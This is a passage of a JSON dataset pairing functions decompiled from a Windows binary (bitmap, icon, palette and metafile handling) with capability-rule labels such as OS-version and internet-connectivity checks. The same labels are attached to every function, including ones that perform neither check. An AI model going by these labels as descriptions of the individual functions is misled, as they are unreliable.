        "decompiled_code": "\nvoid __cdecl fcn.00426510(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar3;\n    int32_t iStack156;\n    uint uStack152;\n    uchar *puStack148;\n    uint uStack144;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint hdc;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack132 = 0x426536;\n    fcn.00402ee8();\n    uStack136 = 0x426809;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    uStack144 = 0x426555;\n    puStack132 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    if ((*arg_ch | arg_ch[1]) == 0) {\n        uStack144 = 0xb;\n        puStack148 = 0x426563;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        *arg_8h = uVar1;\n        puStack148 = 0xc;\n        uStack152 = 0x42656f;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        arg_8h[1] = uVar1;\n    }\n    else {\n        *arg_8h = *arg_ch;\n        arg_8h[1] = arg_ch[1];\n    }\n    uStack144 = 0;\n    puStack148 = 0x42658b;\n    iVar2 = sub.user32.dll_GetDC();\n    if (iVar2 == 0) {\n        puStack148 = 0x426599;\n        fcn.004259c8();\n    }\n    uStack152 = 0x4265f9;\n    iStack156 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff64;\n    puStack148 = &stack0xfffffffc;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xe);\n    iVar3 = iVar2;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xc);\n    *in_FS_OFFSET = iVar3;\n    sub.user32.dll_ReleaseDC(0, iVar2, 0x426600);\n    return;\n}\n",
        "token_count": 568
    },
    "00426834": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426834(uint32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uchar auStack96 [4];\n    int16_t iStack92;\n    int16_t iStack90;\n    uint32_t auStack84 [18];\n    \n    auStack84[3] = 0;\n    iVar1 = sub.gdi32.dll_GetObjectA();\n    if (iVar1 == 0) {\n        fcn.004259a4();\n    }\n    else if ((iVar1 < 0x40) || (auStack84[0] < 0x28)) {\n        fcn.00403af4();\n        *param_2 = 0x28;\n        param_2[1] = 0x54;\n        param_2[2] = auStack96;\n    }\n    else {\n        puVar3 = auStack84;\n        puVar4 = param_2;\n        for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    if (param_1 == 2) {\n        *(param_2 + 0xe) = 1;\n    }\n    else if (param_1 - 3 < 0xe) {\n        *(param_2 + 0xe) = 4;\n        param_2[8] = param_1;\n    }\n    else if (param_1 - 0x11 < 0xf0) {\n        *(param_2 + 0xe) = 8;\n        param_2[8] = param_1;\n    }\n    else {\n        *(param_2 + 0xe) = iStack90 * iStack92;\n    }\n    *(param_2 + 3) = 1;\n    if (param_2[8] < param_2[9]) {\n        param_2[9] = param_2[8];\n    }\n    if (param_2[5] == 0) {\n        iVar1 = fcn.00425c54();\n        uVar2 = param_2[2] >> 0x1f;\n        param_2[5] = iVar1 * ((param_2[2] ^ uVar2) - uVar2);\n    }\n    return;\n}\n",
        "token_count": 564
    },
    "00426988": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00426988(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint hdc;\n    int32_t hpal;\n    uint var_1h;\n    \n    uStack32 = 0x4269a3;\n    fcn.00426834();\n    hpal = 0;\n    uStack32 = 0;\n    puStack36 = 0x4269af;\n    uVar1 = sub.gdi32.dll_CreateCompatibleDC();\n    uStack40 = 0x426a25;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.00426988::var_1h + 1;\n    if (in_EDX != 0) {\n        puStack36 = &fcn.00426988::var_1h + 1;\n        hpal = sub.gdi32.dll_SelectPalette(uVar1);\n        sub.gdi32.dll_RealizePalette(uVar1);\n    }\n    uVar4 = *(in_ECX + 8);\n    uVar3 = uVar1;\n    iVar2 = sub.gdi32.dll_GetDIBits();\n    var_1h._0_1_ = iVar2 != 0;\n    *in_FS_OFFSET = uVar3;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar1, hpal, 0, 0x426a2c, uVar4, arg_ch);\n    }\n    sub.gdi32.dll_DeleteDC(uVar1);\n    return;\n}\n",
        "token_count": 441
    },
    "00426a60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00426a60(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint *puStack104;\n    uint var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint piconinfo;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ah;\n    ushort var_26h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack104 = 0x426a7f;\n    fcn.00403af4();\n    puStack104 = 0x426a8e;\n    fcn.00403af4();\n    puStack104 = &fcn.00426a60::piconinfo;\n    puStack112 = 0x426a98;\n    uStack108 = param_2;\n    sub.user32.dll_GetIconInfo();\n    puStack112 = 0x426a9d;\n    fcn.00426a54();\n    uStack116 = 0x426c50;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &fcn.00426a60::var_1h + 1;\n    fcn.00426918(2);\n    puStack132 = 0x426acb;\n    fcn.00426918(0xffffffff);\n    var_18h = 0;\n    var_1ch = 0;\n    var_20h = 0;\n    var_24h = 0;\n    uStack136 = 0x426c29;\n    uStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &fcn.00426a60::var_1h + 1;\n    var_18h = fcn.00402ee8();\n    var_1ch = fcn.00402ee8();\n    var_20h = fcn.00402ee8();\n    var_24h = fcn.00402ee8();\n    fcn.00426988(2, var_1ch);\n    uVar3 = 0xffffffff;\n    fcn.00426988(0xffffffff, var_24h);\n    if (var_1h != '\\0') {\n        var_30h = var_ch + 0x16 + var_14h + var_10h;\n        (**(*in_EAX + 0x10))();\n    }\n    var_2ah._2_2_ = 1;\n    var_26h = 1;\n    (**(*in_EAX + 0x10))();\n    iVar2 = var_20h;\n    (**(*in_EAX + 0x10))();\n    piVar1 = iVar2 + 8;\n    *piVar1 = *piVar1 + *(iVar2 + 8);\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    *in_FS_OFFSET = uVar3;\n    fcn.00402f1c(0x426c30);\n    fcn.00402f1c();\n    fcn.00402f1c();\n    fcn.00402f1c();\n    return;\n}\n",
        "token_count": 895
    },
    "00426c98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00426c98(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x20) = 1;\n    if (*(in_EAX + 0x12) != 0) {\n        (**(in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00426cb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00426cb0(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        uVar2 = (**(**(arg_8h + -8) + 0x1c))();\n        return uVar2 ^ 1;\n    }\n    cVar1 = fcn.004047dc();\n    if ((cVar1 != '\\0') && (cVar1 = (**(**(arg_8h + -8) + 0x18))(),  cVar1 != '\\0')) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 163
    },
    "00426d54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00426d54(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    ulong uVar7;\n    ulong uVar8;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 == NULL) {\ncode_r0x00426d79:\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack32 = 0x426d6c;\n        iVar2 = fcn.00404528();\n        puStack32 = 0x426d75;\n        iVar3 = fcn.00404528();\n        if (iVar2 != iVar3) goto code_r0x00426d79;\n        var_1h._0_1_ = 1;\n    }\n    puStack32 = 0x426d89;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 == '\\0') {\n        puStack32 = 0x426d94;\n        cVar1 = (**(*param_2 + 0x1c))();\n        if (cVar1 == '\\0') {\n            if (var_1h != 0) {\n                puStack32 = 0x426dd2;\n                puVar4 = fcn.00404620();\n                uStack36 = 0x426e8b;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x426ded;\n                puStack32 = &fcn.00426d54::var_1h + 1;\n                (**(*in_EAX + 0x44))();\n                puStack44 = 0x426df9;\n                puVar5 = fcn.00404620();\n                uStack48 = 0x426e6e;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.00426d54::var_1h + 1;\n                (**(*param_2 + 0x44))();\n                uVar7 = (***puVar4)();\n                uVar8 = (***puVar5)();\n                if (uVar8 >> 0x20 == uVar7 >> 0x20 && uVar8 == uVar7) {\n                    (***puVar4)();\n                    cVar1 = fcn.0040995c();\n                    if (cVar1 != '\\0') {\n                        var_1h._0_1_ = 1;\n                        goto code_r0x00426e55;\n                    }\n                }\n                var_1h._0_1_ = 0;\ncode_r0x00426e55:\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x426e75;\n                uStack48 = 0x426e6d;\n                uVar6 = fcn.00404650();\n                return uVar6;\n            }\n            goto code_r0x00426e92;\n        }\n    }\n    puStack32 = 0x426d9f;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 != '\\0') {\n        puStack32 = 0x426daa;\n        cVar1 = (**(*param_2 + 0x1c))();\n        if (cVar1 != '\\0') {\n            var_1h._0_1_ = 1;\n            goto code_r0x00426e92;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x00426e92:\n    return var_1h;\n}\n",
        "token_count": 941
    },
    "00426f00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426f00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1a) != 0) {\n        (**(in_EAX + 0x18))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00426fcc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00426fcc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    uStack288 = 0x42704a;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    iVar1 = *(in_EAX + 8) + -1;\n    uVar2 = iVar1 == 0;\n    if (-1 < iVar1) {\n        do {\n            fcn.004198b4();\n            fcn.00404530();\n            fcn.00405794();\n            fcn.00405974();\n            if (uVar2) break;\n            iVar1 = iVar1 + -1;\n            uVar2 = iVar1 == -1;\n        } while (!uVar2);\n    }\n    *in_FS_OFFSET = uStack292;\n    puStack284 = 0x427051;\n    uStack288 = 0x427049;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 282
    },
    "004271d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004271d0(uint param_1, int16_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 8) + 8) + -1;\n    if (-1 < iVar3) {\n        do {\n            iVar1 = fcn.004198b4();\n            if (param_2 == iVar1) {\n                uVar2 = fcn.004198b4();\n                return uVar2;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 158
    },
    "0042720c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0042720c(void)\n\n{\n    if (*0x492e40 == 0) {\n        *0x492e40 = fcn.004270bc();\n    }\n    return *0x492e40;\n}\n",
        "token_count": 54
    },
    "00427574": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427574(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x22) != 0) {\n        (**(in_EAX + 0x20))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "004275a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004275a0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack112;\n    uint uStack108;\n    int32_t *piStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    int32_t *var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    uStack96 = 0x4276a6;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    piStack104 = 0x4275cf;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x4275dd;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x4275e8;\n    fcn.00405794();\n    piStack104 = 0x4275f5;\n    iVar1 = fcn.00426fcc();\n    var_4h = NULL;\n    if (iVar1 != 0) {\n        piStack104 = 0x427603;\n        var_4h = (**(iVar1 + 0x48))();\n        uStack108 = 0x427628;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        piStack104 = &stack0xfffffffc;\n        (**(*var_4h + 0x30))();\n        *in_FS_OFFSET = uStack112;\n    }\n    piStack104 = 0x427647;\n    fcn.00404650();\n    *(in_EAX + 0xc) = var_4h;\n    if (var_4h != NULL) {\n        var_4h[5] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x427665;\n        iVar1 = fcn.00404864();\n        piStack104[4] = iVar1;\n        var_4h[7] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x42767d;\n        iVar1 = fcn.00404864();\n        piStack104[6] = iVar1;\n    }\n    piStack104 = 0x427690;\n    fcn.0040484c();\n    *in_FS_OFFSET = uStack100;\n    puStack92 = 0x4276ad;\n    uStack96 = 0x4276a5;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 596
    },
    "0042770c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0042770c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char cVar3;\n    bool bVar4;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x20);\n    if (iVar1 == 0) {\n        bVar4 = *(*(arg_8h + -8) + 0xc) != 0;\n    }\n    else {\n        bVar4 = true;\n        cVar3 = fcn.004047dc();\n        if (cVar3 != '\\0') {\n            if ((*(*(arg_8h + -8) + 0xc) == *(iVar1 + 0xc)) ||\n               (((piVar2 = *(*(arg_8h + -8) + 0xc),  piVar2 != NULL && (*(iVar1 + 0xc) != 0)) &&\n                (cVar3 = (**(*piVar2 + 0x18))(),  cVar3 != '\\0')))) {\n                bVar4 = false;\n            }\n            else {\n                bVar4 = true;\n            }\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 266
    },
    "00427cc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00427cc4(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint lpemh;\n    uint var_76h;\n    uint var_72h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    int32_t var_22h;\n    uint var_1ch;\n    uint nNumber;\n    uint nDenominator;\n    int16_t var_eh;\n    uint lpbBuffer;\n    int32_t cbBuffer;\n    int32_t *var_4h;\n    \n    puStack172 = 0x427cdf;\n    var_4h = param_2;\n    fcn.00427b60();\n    puStack172 = 0x427cef;\n    (**(*var_4h + 0xc))();\n    if (var_22h == -0x65393229) {\n        puStack172 = 0x427d00;\n        iVar2 = fcn.0042681c();\n        if (iVar2 == var_eh) goto code_r0x00427d0b;\n    }\n    puStack172 = 0x427d0b;\n    fcn.004259bc();\ncode_r0x00427d0b:\n    cbBuffer = cbBuffer + -0x16;\n    puStack172 = 0x427d17;\n    lpbBuffer = fcn.00402f00();\n    iVar1 = *(in_EAX + 0x28);\n    uStack176 = 0x427e33;\n    iStack180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff4c;\n    puStack172 = &stack0xfffffffc;\n    (**(*var_4h + 0xc))();\n    *(*(in_EAX + 0x28) + 0x18) = nDenominator;\n    if (nDenominator == 0) {\n        nDenominator._0_2_ = 0x60;\n    }\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber - var_1ch, 0x9ec, nDenominator);\n    *(iVar1 + 0xc) = uVar3;\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber._2_2_ - var_1ch._2_2_, 0x9ec, nDenominator);\n    *(iVar1 + 0x10) = uVar3;\n    var_32h = 8;\n    var_2eh = 0;\n    var_2ah = 0;\n    var_26h = 0;\n    iVar4 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.00427cc4::var_32h);\n    *(iVar1 + 8) = iVar4;\n    if (iVar4 == 0) {\n        fcn.004259bc();\n    }\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &fcn.00427cc4::lpemh);\n    var_32h = 8;\n    var_2eh = var_76h;\n    var_2ah = var_72h;\n    var_26h = 0;\n    sub.gdi32.dll_DeleteEnhMetaFile(*(iVar1 + 8));\n    iVar4 = cbBuffer;\n    iVar5 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.00427cc4::var_32h);\n    *(iVar1 + 8) = iVar5;\n    if (iVar5 == 0) {\n        fcn.004259bc();\n    }\n    *(in_EAX + 0x2c) = 0;\n    *in_FS_OFFSET = iVar4;\n    fcn.00402f1c(0x427e3a);\n    return;\n}\n",
        "token_count": 938
    },
    "00427f9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427f9c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.00427b60();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x20) = 0;\n    if (param_2 != *(iVar1 + 0x10)) {\n        fcn.004280ec();\n        *(in_EAX[10] + 0x10) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00427fd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427fd8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.00427b60();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x1c) = 0;\n    if (param_2 != *(iVar1 + 0xc)) {\n        fcn.004280ec();\n        *(in_EAX[10] + 0xc) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "004281f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004281f0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) != 0) {\n        uStack24 = 0;\n        uStack28 = 0;\n        uStack32 = *(*(in_EAX + 0x28) + 8);\n        puStack36 = 0x428210;\n        iVar1 = sub.gdi32.dll_GetEnhMetaFileBits();\n        if (iVar1 != 0) {\n            puStack36 = 0x428221;\n            uVar2 = fcn.00402f00();\n            uStack40 = 0x42826c;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            uVar3 = *(*(in_EAX + 0x28) + 8);\n            puStack36 = &stack0xfffffffc;\n            sub.gdi32.dll_GetEnhMetaFileBits(uVar3, iVar1, uVar2);\n            fcn.0041b994();\n            *in_FS_OFFSET = uVar3;\n            fcn.00402f1c(0x428273);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "0042827c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0042827c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint *in_FS_OFFSET;\n    uint uVar6;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uint var_22h;\n    uint var_18h;\n    uint nNumerator;\n    uint var_eh;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        return;\n    }\n    uStack52 = 0x4282a1;\n    fcn.00403af4();\n    iVar1 = *(in_EAX + 0x28);\n    nNumerator._0_2_ = *(iVar1 + 0x18);\n    if (nNumerator == 0) {\n        nNumerator._0_2_ = 0x60;\n    }\n    uStack52 = 0x9ec;\n    uStack56 = nNumerator;\n    uStack60 = *(iVar1 + 0xc);\n    uStack64 = 0x4282d3;\n    sub.kernel32.dll_MulDiv();\n    uStack64 = 0x9ec;\n    uStack68 = nNumerator;\n    uStack72 = *(iVar1 + 0x10);\n    uStack76 = 0x4282ea;\n    sub.kernel32.dll_MulDiv();\n    uStack76 = 0x4282f6;\n    fcn.0042681c();\n    uStack76 = 0;\n    puStack80 = 0x428301;\n    uVar2 = sub.user32.dll_GetDC();\n    uStack84 = 0x4283b7;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 8;\n    uStack100 = 0;\n    uStack104 = 0;\n    uStack108 = *(iVar1 + 8);\n    puStack112 = 0x428325;\n    uStack92 = uVar2;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = sub.gdi32.dll_GetWinMetaFileBits();\n    puStack112 = 0x428330;\n    uVar4 = fcn.00402f00();\n    uStack116 = 0x428397;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    uVar6 = *(iVar1 + 8);\n    puStack112 = &stack0xfffffffc;\n    uVar5 = sub.gdi32.dll_GetWinMetaFileBits(uVar6, uVar3, uVar4, 8, uVar2);\n    if (uVar5 < uVar3) {\n        fcn.00425a1c();\n    }\n    fcn.0041b994();\n    